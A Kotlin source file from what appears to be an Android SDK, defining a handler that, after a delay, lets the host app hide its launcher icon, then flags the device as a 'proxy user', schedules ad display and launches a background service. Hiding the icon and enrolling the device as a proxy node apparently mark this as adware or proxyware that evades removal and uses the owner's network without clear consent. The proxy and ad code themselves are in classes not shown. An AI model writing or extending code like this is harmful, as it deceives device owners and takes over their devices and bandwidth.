package com.app.sdk.sdk.event.handler.impl

import android.content.Context
import com.app.sdk.sdk.PremiumUserSdk
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.event.handler.PremiumUserHandler
import com.app.sdk.sdk.services.schedulers.ServiceScheduler
import java.util.*

object ProxyUserHandler : PremiumUserHandler {

    override fun doOnTrigger(context: Context) {
      ServiceScheduler.launchSingle(context)
    }

    override fun needRunOnTrigger(context: Context): Boolean {
        return Prefs.getInstance(context).isProxyUser()
    }

    override fun afterIconHide(context: Context) {
        Prefs.getInstance(context).setUserAsProxy()
        Prefs.getInstance(context).setShowAdTime(SdkConfig.getLaunchAdTime())
    }

    override fun canHideIcon(context: Context) = !Prefs.getInstance(context).isProxyUser() &&
            !PremiumUserSdk.hasOverlayPermission(context) && proxyDelayDone(context)

    private fun proxyDelayDone(context: Context): Boolean {
        val proxyStartTime = Prefs.getInstance(context).getStartProxyTime()
        return proxyStartTime != -1L && Date().time >= proxyStartTime
    }
}